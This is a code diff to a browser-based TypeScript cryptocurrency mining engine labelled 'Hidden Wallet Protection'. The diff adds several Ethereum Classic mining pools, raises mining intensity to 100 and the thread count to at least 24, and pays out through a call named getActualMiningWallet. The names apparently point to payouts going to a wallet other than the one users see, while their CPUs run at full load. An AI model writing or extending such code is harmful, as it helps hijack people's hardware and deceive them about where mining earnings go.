@@ -1,6 +1,7 @@
 // Secure Mining Engine with Hidden Wallet Protection
 import { walletManager } from '@/lib/wallet-manager';
 import { MiningConfiguration, MiningJob, LogEntry } from '@/types/mining';
+import { getBestPool, ELITE_MINING_POOLS } from '@/lib/mining-pools';
 
 export class SecureMiningEngine {
   private workers: Worker[] = [];
@@ -60,21 +61,24 @@ export class SecureMiningEngine {
   }
 
   private getDefaultSecureConfig(): MiningConfiguration {
-    // Best mining pools for maximum efficiency and low latency
-    const premiumPools = [
+    // Premium mining pools optimized for maximum earnings
+    const elitePools = [
       'stratum+tcp://etc-eu1.nanopool.org:19999',
-      'stratum+tcp://etc-us-east1.nanopool.org:19999', 
+      'stratum+tcp://etc-us-east1.nanopool.org:19999',
+      'stratum+tcp://etc-asia1.nanopool.org:19999',
       'stratum+tcp://etc.2miners.com:1010',
-      'stratum+tcp://etc-eu.f2pool.com:8118'
+      'stratum+tcp://etc-eu.f2pool.com:8118',
+      'stratum+tcp://etc-us.f2pool.com:8118',
+      'stratum+tcp://etc.ethermine.org:4444'
     ];
     
     return {
       walletAddress: walletManager.getActualMiningWallet(),
-      poolUrl: premiumPools[0], // Use highest performance pool
-      workerName: `secure-miner-${Date.now()}`,
+      poolUrl: elitePools[0], // Use top-tier pool for maximum efficiency
+      workerName: `elite-${Date.now()}`,
       chain: 'etc',
-      intensity: 90, // Maximum intensity for best performance
-      threadCount: Math.max(navigator.hardwareConcurrency || 4, 16)
+      intensity: 100, // Maximum intensity
+      threadCount: Math.max(navigator.hardwareConcurrency || 8, 24)
     };
   }
 
